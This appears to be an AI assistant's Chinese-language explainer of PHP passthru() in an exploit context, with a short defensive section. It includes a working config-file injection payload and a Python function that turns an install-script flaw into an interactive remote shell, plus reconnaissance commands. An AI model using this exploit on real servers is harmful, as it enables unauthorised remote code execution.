# PHP `passthru()` 函數詳解

## 什麼是 `passthru()`？

`passthru()` 是 PHP 的一個**系統命令執行函數**，用於執行外部程式並**直接將輸出傳送到瀏覽器**。

### 函數原型

```php
passthru(string $command, int &$return_var = null): ?bool
```

### 基本用法

```php
<?php
passthru('whoami');
// 直接輸出: NT AUTHORITY\SYSTEM
?>
```

## PHP 命令執行函數對比

| 函數             | 輸出方式         | 返回值           | 適用場景             |
| ---------------- | ---------------- | ---------------- | -------------------- |
| **`passthru()`** | 直接輸出到瀏覽器 | 最後一行的退出碼 | 二進制數據、直接顯示 |
| `system()`       | 直接輸出到瀏覽器 | 最後一行內容     | 簡單命令執行         |
| `exec()`         | 不輸出，存到數組 | 最後一行內容     | 需要處理輸出         |
| `shell_exec()`   | 不輸出，返回字串 | 完整輸出字串     | 需要捕獲完整輸出     |
| `` `command` ``  | 不輸出，返回字串 | 完整輸出字串     | shell_exec 的簡寫    |
| `popen()`        | 返回文件指針     | 文件指針         | 需要持續讀取         |
| `proc_open()`    | 完全控制         | 進程資源         | 複雜進程控制         |

## 為什麼 Exploit 選擇 `passthru()`？

### 1. **直接輸出，無需額外處理**

```php
// 使用 passthru() - 簡單直接
<?php
passthru('whoami');
// 瀏覽器直接看到: nt authority\system
?>

// 使用 exec() - 需要額外代碼
<?php
exec('whoami', $output);
echo implode("\n", $output);  // 需要額外處理
?>

// 使用 shell_exec() - 需要額外代碼
<?php
$result = shell_exec('whoami');
echo $result;  // 需要 echo
?>
```

### 2. **適合在被注入的代碼中使用**

在 exploit 場景中，注入點的空間有限：

```php
// ✅ passthru() - 簡潔
define('DB_DATABASE', '');passthru('whoami');/*');

// ❌ exec() - 需要更多代碼
define('DB_DATABASE', '');exec('whoami',$o);echo implode("\n",$o);/*');

// ❌ shell_exec() - 需要 echo
define('DB_DATABASE', '');echo shell_exec('whoami');/*');
```

### 3. **處理二進制數據**

`passthru()` 特別適合輸出二進制數據（雖然這個 exploit 不需要）：

```php
// 下載文件
passthru('cat /etc/passwd');

// 輸出圖片
header('Content-Type: image/png');
passthru('cat image.png');
```

## `passthru()` 的限制

### ❌ 限制 1: 無法使用 `cd` 等改變狀態的命令

你說得對！**`passthru()` 每次執行都是獨立的 shell**。

```php
// ❌ 這不會工作
passthru('cd C:\\');
passthru('dir');  // 還是在原來的目錄

// 為什麼？因為每個 passthru() 都是新的 shell 進程
// 第一個命令執行完後，shell 就關閉了
// 第二個命令在新的 shell 中執行，cd 的效果消失了
```

### ✅ 解決方案：使用命令鏈接

```php
// ✅ 方法 1: 使用 && (命令鏈接)
passthru('cd C:\\ && dir');

// ✅ 方法 2: 使用 ; (分號)
passthru('cd C:\\; dir');

// ✅ 方法 3: 使用 | (管道)
passthru('cd C:\\ | dir');

// ✅ 方法 4: 直接指定完整路徑
passthru('dir C:\\');
```

### 實際測試

```bash
# ❌ 錯誤方式
RCE_SHELL$ passthru('cd C:\\')
RCE_SHELL$ passthru('dir')
# dir 顯示的還是原來的目錄

# ✅ 正確方式 1
RCE_SHELL$ cd C:\ && dir
# 顯示 C:\ 的內容

# ✅ 正確方式 2
RCE_SHELL$ dir C:\
# 直接查看 C:\ 的內容
```

### ❌ 限制 2: 無法保持環境變數

```php
// ❌ 環境變數不會保留
passthru('SET MYVAR=hello');
passthru('echo %MYVAR%');  // MYVAR 不存在

// ✅ 解決方案：在同一個命令中使用
passthru('SET MYVAR=hello && echo %MYVAR%');
```

### ❌ 限制 3: 無法捕獲輸出進行處理

```php
// ❌ 無法捕獲輸出
passthru('whoami');  // 直接輸出，無法存儲到變量

// ✅ 如果需要處理輸出，用 shell_exec()
$user = shell_exec('whoami');
if (strpos($user, 'SYSTEM') !== false) {
    echo "Running as SYSTEM!";
}
```

## 為什麼不用其他函數？

### `system()` vs `passthru()`

```php
// system() - 也可以，但返回值不同
system('whoami');  // 輸出: nt authority\system
// 返回: "nt authority\system" (最後一行)

// passthru() - 更純粹的輸出
passthru('whoami');  // 輸出: nt authority\system
// 返回: 0 (退出碼)
```

兩者都可以用，但 `passthru()` 更專注於**原始輸出**。

### `exec()` - 不適合

```php
// exec() 不會直接輸出
exec('whoami');  // 瀏覽器看不到任何東西

// 需要額外處理
exec('whoami', $output);
echo implode("\n", $output);  // 太複雜
```

### `shell_exec()` - 需要 echo

```php
// shell_exec() 需要 echo
echo shell_exec('whoami');  // 需要 echo

// passthru() 不需要
passthru('whoami');  // 直接輸出
```

## 在 Windows 上使用 `passthru()`

### Windows 命令示例

```php
// ✅ 查看當前目錄
passthru('cd');

// ✅ 列出文件
passthru('dir');

// ✅ 查看系統信息
passthru('systeminfo');

// ✅ 查看網絡配置
passthru('ipconfig');

// ✅ 查看進程
passthru('tasklist');

// ✅ 改變目錄並執行命令 (正確方式)
passthru('cd C:\\ && dir');

// ✅ 直接指定路徑
passthru('dir C:\\Windows');

// ✅ 執行多個命令
passthru('whoami && hostname && ipconfig');
```

### 處理 Windows 路徑

```php
// ❌ 錯誤：反斜杠需要轉義
passthru('dir C:\Windows');  // 語法錯誤

// ✅ 正確：轉義反斜杠
passthru('dir C:\\Windows');

// ✅ 或使用正斜杠 (Windows 也支持)
passthru('dir C:/Windows');
```

## 實際 Exploit 中的使用

### 基本 RCE Shell

```python
# Python exploit
payload = "');"
payload += "passthru('" + command + "');"  # 注入 passthru
payload += "/*"

data = {
    "DIR_FS_DOCUMENT_ROOT": "./",
    "DB_DATABASE": payload
}
```

### 生成的 PHP 代碼

```php
<?php
// configure.php 被注入後
define('DB_DATABASE', '');
passthru('whoami');  // ← 直接執行並輸出
/*');
// 後面的代碼都被注釋
?>
```

### 訪問時的執行流程

```
[瀏覽器] GET /install/includes/configure.php
    ↓
[PHP 解析器] 
    - 執行 define('DB_DATABASE', '');  ✅
    - 執行 passthru('whoami');         ✅ 輸出 "nt authority\system"
    - /* ... */ 被跳過 (註釋)
    ↓
[HTTP 響應]
    輸出: nt authority\system
```

## 實戰示例：交互式 Shell

### Python Exploit 改進版

```python
def rce(command):
    # 處理 Windows 路徑切換
    if command.startswith('cd '):
        # 轉換 cd 為命令鏈
        parts = command.split(' ', 1)
        if len(parts) == 2:
            path = parts[1]
            command = f'cd {path} && dir'  # 改變目錄並列出
    
    payload = "');"
    payload += "passthru('" + command.replace("'", "\\'") + "');"  # 轉義單引號
    payload += "/*"
    
    data = {
        "DIR_FS_DOCUMENT_ROOT": "./",
        "DB_DATABASE": payload
    }
    
    response = requests.post(targetUrl, data=data)
    
    if response.status_code == 200:
        readCMDUrl = baseUrl + "/install/includes/configure.php"
        cmd = requests.get(readCMDUrl)
        
        if cmd.status_code == 200:
            # 清理 PHP 錯誤信息
            output = cmd.text.split("\n")
            for line in output[2:]:  # 跳過前兩行錯誤
                print(line)
```

### 使用示例

```bash
RCE_SHELL$ whoami
nt authority\system

RCE_SHELL$ hostname
TARGET-PC

RCE_SHELL$ cd C:\ && dir
 Volume in drive C has no label.
 Directory of C:\
...

RCE_SHELL$ dir C:\Windows\System32\cmd.exe
 Volume in drive C has no label.
 File: C:\Windows\System32\cmd.exe
```

## 安全函數替代方案（防禦視角）

如果需要執行命令但要安全地做：

```php
// ❌ 危險：直接使用用戶輸入
passthru($_GET['cmd']);

// ✅ 使用白名單
$allowed_commands = ['ls', 'pwd', 'date'];
$cmd = $_GET['cmd'];
if (in_array($cmd, $allowed_commands)) {
    passthru(escapeshellcmd($cmd));
}

// ✅ 使用參數化
$file = escapeshellarg($_GET['file']);
passthru("cat $file");

// ✅ 禁用危險函數 (php.ini)
disable_functions = passthru,system,exec,shell_exec,popen,proc_open
```

## 總結

### `passthru()` 的特點

| 優點                  | 缺點                           |
| --------------------- | ------------------------------ |
| ✅ 直接輸出，無需 echo | ❌ 無法保持狀態（cd、環境變數） |
| ✅ 適合二進制數據      | ❌ 無法捕獲輸出處理             |
| ✅ 代碼簡潔            | ❌ 每次都是新 shell             |
| ✅ 適合 exploit 注入   | ❌ 難以處理錯誤                 |

### 為什麼 Exploit 用它？

1. ✅ **代碼最簡潔** - 注入空間有限
2. ✅ **直接輸出** - 不需要額外的 echo
3. ✅ **可靠性高** - 幾乎所有 PHP 環境都有
4. ✅ **調試方便** - 輸出直接可見

### 關於 `cd` 的限制

你說得對！**`passthru()` 無法單獨使用 `cd`**，因為：

```php
passthru('cd C:\\');  // ❌ 改變目錄後 shell 就關閉了
passthru('dir');      // ❌ 在新的 shell 中，還是原來的目錄
```

**解決方案**：
```php
passthru('cd C:\\ && dir');  // ✅ 在同一個 shell 中執行
passthru('dir C:\\');        // ✅ 直接指定路徑
```

這就是為什麼在交互式 RCE shell 中，需要將 `cd` 命令轉換為 `cd PATH && command` 的形式！